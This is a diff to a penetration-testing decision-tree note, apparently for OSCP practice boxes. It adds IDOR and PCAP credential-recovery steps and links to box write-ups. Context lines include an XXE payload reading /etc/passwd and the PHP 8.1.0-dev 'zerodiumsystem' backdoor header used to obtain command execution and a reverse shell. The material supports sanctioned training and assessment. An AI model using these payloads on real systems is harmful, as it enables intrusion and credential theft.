@@ -54,6 +54,15 @@ Part of [[DECISION TREE]]. "I found X, what do I try" for XSS, command injection
 → **Verb tamper the write endpoint if still denied:** POST → GET may bypass a session-vs-uid check that only applies to POST
 → See [[09. Common Web Application Attacks#9.5.2. IDOR (Insecure Direct Object Reference)|IDOR enumeration and exploitation]], [[Web Applications#IDOR. Insecure Direct Object Reference|Command Appendix]]
 
+### A web app exposes numeric capture, report, or download IDs
+
+→ Compare the smallest adjacent ID range with curl or Burp Repeater
+→ Save status, redirects, body length, content type, and the actual body; 200 alone is not proof
+→ If one ID returns a downloadable PCAP, preserve it in private loot and open [[OSCP/RUNBOOK V2/Linux - IDOR and PCAP Credential Recovery|Linux - IDOR and PCAP Credential Recovery]]
+→ Run capinfos and tshark protocol filters; inspect FTP, Telnet, or HTTP authentication only when the protocol is present
+→ Store any recovered credential privately and validate it once against the service suggested by the evidence
+→ See [[OSCP/BOXES/WRITE UPS/Linux/Cap|Cap]]
+
 ### A form submission contains XML in the body (Content-Type: application/xml or body starts with <?xml)
 → This is an XXE candidate. Inject `<!ENTITY test "HELLO">` and reference `&test;` in a reflected field, if "HELLO" appears in the response, external entities are being resolved
 → **Read a file:** `<!DOCTYPE email [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`, reference `&xxe;` in any field that reflects
@@ -268,6 +277,11 @@ This page turns one repeatable part of an authorized assessment into a checklist
 - [[OSCP/BOXES/WRITE UPS/Linux/Mirai|Mirai]] -- product fingerprinting, `/admin/` discovery, controlled default-credential validation, and direct sudo escalation
 - [[OSCP/BOXES/WRITE UPS/Windows/Love|Love]] -- staging-host SSRF, internal Voting System disclosure, and authenticated upload routing
 - [[OSCP/BOXES/WRITE UPS/Linux/Blocky|Blocky]] -- demonstrates WordPress REST disclosure, plugin artifact review, and slow-response triage
+- [[OSCP/BOXES/WRITE UPS/Linux/Cap|Cap]] -- demonstrates bounded object-ID comparison, IDOR, and linked PCAP recovery
+- [[OSCP/BOXES/WRITE UPS/Windows/MarkUp|MarkUp]] -- demonstrates XML external entity processing chained to an SSH-key write
+- [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]] -- demonstrates HFS command injection and callback delivery
+- [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]] -- demonstrates pre-authentication OpenAM JATO deserialization and a web-to-local credential pivot
+- [[OSCP/BOXES/WRITE UPS/Linux/Pelican|Pelican]] -- demonstrates an unauthenticated Exhibitor configuration command-injection branch
 
 ### `X-Powered-By` discloses PHP/8.1.0-dev
 → Save the headers and confirm the exact development-build string with `curl -sSI`
@@ -277,7 +291,7 @@ curl -fsS -H 'User-Agentt: zerodiumsystem("id");' \
   "http://$BoxIP:$WebPort/" | grep -m1 'uid='
 ```
 → If `uid=` is returned, start a listener and send the Bash callback through the same header
-→ Go to [[RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]], then [[RUNBOOK V2/Linux - Shell Stabilise|Linux - Shell Stabilise]]
+→ Go to [[OSCP/RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]], then [[OSCP/RUNBOOK V2/Linux - Shell Stabilise|Linux - Shell Stabilise]]
 → See [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]] and [[Web Applications#PHP 8.1.0-dev `User-Agentt` backdoor|Command Appendix]]
 
 ### A Windows web service identifies Rejetto HttpFileServer 2.3
